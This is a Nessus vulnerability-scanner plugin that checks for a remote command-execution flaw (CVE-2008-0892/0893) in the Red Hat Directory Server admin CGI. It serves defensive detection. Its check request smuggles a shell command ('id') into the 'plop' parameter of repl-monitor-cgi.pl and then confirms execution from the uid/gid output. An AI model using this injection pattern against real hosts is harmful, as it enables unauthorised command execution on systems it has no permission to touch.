#
# (C) Tenable Network Security
#

include("compat.inc");

if(description)
{
 script_id(32032);
 script_version("$Revision: 1.5 $");
 script_bugtraq_id(28802);
 script_xref(name:"OSVDB", value:"44456");
 script_xref(name:"OSVDB", value:"44457");
 script_cve_id("CVE-2008-0892","CVE-2008-0893");
  
 script_name(english:"Red Hat Administration Server (redhat-ds-admin) Multiple Remote Vulnerabilities");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that is prone to arbitrary
command execution." );
 script_set_attribute(attribute:"description", value:
"The remote host is running RedHat or Fedora Directory Server Admin
Service. 

The version of this software installed on the remote host is
vulnerable to remote command execution flaw through the argument
'admurl' of the script '/bin/admin/admin/bin/download'.  A malicious
user could exploit this flaw to execute arbitrary commands on the
remote host." );
 script_set_attribute(attribute:"see_also", value:"http://rhn.redhat.com/errata/RHSA-2008-0199.html" );
 script_set_attribute(attribute:"see_also", value:"http://rhn.redhat.com/errata/RHSA-2008-0201.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to ds-admin 1.1.4 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:S/C:C/I:C/A:C" );
 script_end_attributes();
 
 script_summary(english:"Checks for RedHat/Fedora Directory Server repl-monitor-cgi.pl remote command execution flaw");
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 9830);
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

banner = get_http_banner(port:9830);
if ("Server: Apache" >!< banner) exit(0);

http_check_remote_code (
                        default_port:9830,
			unique_dir:"/dist",
			check_request:'/repl-monitor-cgi.pl?admurl=toto&plop=";id;"',
			extra_check:"<p>Error: Missing configuration file.",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id"
			);
